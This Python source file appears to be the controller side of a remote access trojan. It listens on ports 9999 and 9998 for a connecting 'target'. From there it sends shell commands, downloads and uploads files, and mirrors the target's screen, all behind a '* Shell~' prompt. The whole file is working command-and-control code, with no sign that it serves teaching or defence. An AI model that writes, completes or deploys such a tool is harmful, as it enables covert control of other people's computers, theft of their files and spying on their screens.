import socket
import threading
import json
import os
import cv2
import numpy as np

screen_sharing = False
target_control = None
target_screen = None

def reliable_send(sock, data):
    jsondata = json.dumps(data)
    sock.send(jsondata.encode())

def reliable_recv(sock):
    data = ''
    while True:
        try:
            data += sock.recv(1024).decode()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(sock, file_name):
    with open(file_name, 'rb') as f:
        sock.send(f.read())

def download_file(sock, file_name):
    with open(file_name, 'wb') as f:
        sock.settimeout(1)
        try:
            while True:
                chunk = sock.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        except socket.timeout:
            pass
        finally:
            sock.settimeout(None)

def screen_receiver():
    global screen_sharing, target_screen
    print("[*] Waiting for client to reconnect screen socket...")
    target_screen, ip_screen = sock_screen.accept()
    print(f"[+] Screen connected: {ip_screen}")

    screen_sharing = True
    cv2.namedWindow("Client Screen", cv2.WINDOW_NORMAL)
    try:
        while screen_sharing:
            size_data = target_screen.recv(4)
            if not size_data:
                break
            size = int.from_bytes(size_data, 'big')
            buffer = b''
            while len(buffer) < size:
                packet = target_screen.recv(size - len(buffer))
                if not packet:
                    break
                buffer += packet
            frame = np.frombuffer(buffer, dtype=np.uint8)
            frame = cv2.imdecode(frame, cv2.IMREAD_COLOR)
            if frame is not None:
                cv2.imshow("Client Screen", frame)
                key = cv2.waitKey(1)
                if key == 27:  # ESC key
                    reliable_send(target_control, 'exit_screenshare')
                    screen_sharing = False
                    break
    except Exception as e:
        print(f"[!] Screen receiver error: {e}")
    finally:
        cv2.destroyAllWindows()
        screen_sharing = False
        print("[*] Screenshare session ended.")
        print(f'* Shell~({ip_screen[0]}): ', end='', flush=True)  # Print fresh prompt
def target_communication(ip):
    global screen_sharing
    while True:
        command = input(f'* Shell~({ip}): ')
        reliable_send(target_control, command)

        if command == 'quit':
            break
        elif command == 'clear':
            os.system('clear' if os.name != 'nt' else 'cls')
        elif command.startswith('cd '):
            pass
        elif command.startswith('download '):
            download_file(target_control, command[9:])
        elif command.startswith('upload '):
            upload_file(target_control, command[7:])
        elif command == 'screen_mirror':
            if not screen_sharing:
                threading.Thread(target=screen_receiver, daemon=True).start()
                print("[+] Receiving screen from client...")
            else:
                print("[!] Screen sharing already running.")
        elif command == 'exit_screenshare':
                if screen_sharing:
                    reliable_send(target_control, 'exit_screenshare')
                    screen_sharing = False
                    print("[*] Requested screen share to stop.")
                else:
                    print("[!] No screen sharing session to stop.")
        else:
            try:
                target_control.settimeout(10)
                result = reliable_recv(target_control)
                print(result)
            except socket.timeout:
                print("[!] No response from client.")
            finally:
                target_control.settimeout(None)

# SOCKET SETUP
sock_control = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_control.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock_control.bind(('0.0.0.0', 9999))
sock_control.listen(1)
print("[+] Waiting for control connection...")

sock_screen = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock_screen.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock_screen.bind(('0.0.0.0', 9998))
sock_screen.listen(1)
print("[+] Waiting for screen connections on-demand...")

target_control, ip_control = sock_control.accept()
print(f"[+] Control connected: {ip_control}")

target_communication(ip_control[0])